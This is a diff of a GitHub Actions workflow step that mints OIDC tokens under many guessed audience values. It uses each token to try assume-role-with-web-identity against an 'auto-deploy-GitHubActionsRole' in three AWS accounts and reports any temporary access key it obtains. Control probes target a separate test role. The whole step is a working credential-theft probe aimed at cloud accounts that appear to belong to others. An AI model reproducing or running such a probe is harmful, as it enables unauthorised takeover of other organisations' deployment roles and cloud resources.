@@ -12,17 +12,16 @@ jobs:
     steps:
       - name: aud-matrix
         run: |
-          mint() { local a="$1"; local u="${ACTIONS_ID_TOKEN_REQUEST_URL}"; if [ -n "$a" ]; then u="${u}&audience=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$a")"; fi; curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$u" | python3 -c "import sys,json;print(json.load(sys.stdin).get('value',''))"; }
-          mint sts.amazonaws.com > t_sts; mint foo > t_foo; mint https://github.com/appsecengineer > t_org
-          mint https://github.com/appsecengineer/gh-actions-ami > t_repo; mint gh-actions-ami > t_gh; mint appsecengineer-prod > t_prod
-          for f in t_sts t_foo t_org t_repo t_gh t_prod; do
-            python3 -c "import sys,base64,json; t=open(sys.argv[1]).read().strip(); p=t.split('.')[1]; p+='='*(-len(p)%4); c=json.loads(base64.urlsafe_b64decode(p)); print('${f} len='+str(len(t))+' aud='+str(c['aud'])+' iss='+c['iss'])" "$f"
+          set +e
+          mint() { local a="$1" out; local u="$ACTIONS_ID_TOKEN_REQUEST_URL"; if [ -n "$a" ]; then u="${u}&audience=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$a")"; fi; out=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$u"); echo "$out" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('value','MINT_ERR:'+json.dumps(d)[:160]))"; }
+          probe() { local tag="$1" f="$2" r="$3" t out ak; t=$(cat "$f"); out=$(aws sts assume-role-with-web-identity --role-arn "$r" --role-session-name artex10891 --web-identity-token "$t" --duration-seconds 900 --output json 2>&1); ak=$(echo "$out" | grep -oE 'ASIA[A-Z0-9]+' | head -1); if [ -n "$ak" ]; then echo "$tag => SUCCESS $ak"; else echo "$tag => $(echo "$out" | tr '\n' ' ' | cut -c1-240)"; fi; sleep 1.4; }
+          i=0
+          for a in foo gh-actions-ami appsecengineer appsecengineer.com appsecengineer-prod prod 358174707935 https://github.com/appsecengineer https://github.com/appsecengineer/gh-actions-ami; do
+            i=$((i+1)); f="tok$i"; mint "$a" > "$f"
+            if grep -q '^MINT_ERR' "$f"; then echo "AUDREQ=$a $(cat $f)"; rm -f "$f"; continue; fi
+            python3 -c "import sys,base64,json; t=open(sys.argv[1]).read().strip(); p=t.split('.')[1]; p+='='*(-len(p)%4); c=json.loads(base64.urlsafe_b64decode(p)); print('AUDREQ='+sys.argv[2]+' LEN='+str(len(t))+' aud='+str(c['aud']))" "$f" "$a"
+            if [ "$a" = "foo" ]; then probe "CONTROL_FOO" "$f" arn:aws:iam::060717612896:role/artex10891-oidc-test; fi
+            if [ "$a" = "appsecengineer" ]; then probe "CONTROL_APPSEC" "$f" arn:aws:iam::060717612896:role/artex10891-oidc-test; fi
+            for acct in 358174707935 559556671935 170026776852; do probe "AUD $acct $(basename $f)" "$f" "arn:aws:iam::${acct}:role/auto-deploy-GitHubActionsRole"; done
           done
-          probe() { local tag="$1"; local f="$2"; local r="$3"; local t; t=$(cat "$f"); local out; out=$(aws sts assume-role-with-web-identity --role-arn "$r" --role-session-name artex10891 --web-identity-token "$t" --duration-seconds 900 --output json 2>&1 || true); local ak; ak=$(echo "$out" | grep -oE 'ASIA[A-Z0-9]+' | head -1); if [ -n "$ak" ]; then echo "$tag => SUCCESS $ak"; else echo "$tag => $(echo "$out" | tr '\n' ' ' | cut -c1-220)"; fi; sleep 1.4; }
-          probe CONTROL_STS t_sts arn:aws:iam::060717612896:role/artex10891-oidc-test
-          probe CONTROL_FOO t_foo arn:aws:iam::060717612896:role/artex10891-oidc-test
-          for acct in 358174707935 559556671935 170026776852; do
-            for f in t_sts t_org t_repo t_gh t_prod; do
-              probe "AUD ${acct} ${f}" "$f" "arn:aws:iam::${acct}:role/auto-deploy-GitHubActionsRole"
-            done
-          done
+          mint sts.amazonaws.com > t_sts; probe CONTROL_STS t_sts arn:aws:iam::060717612896:role/artex10891-oidc-test
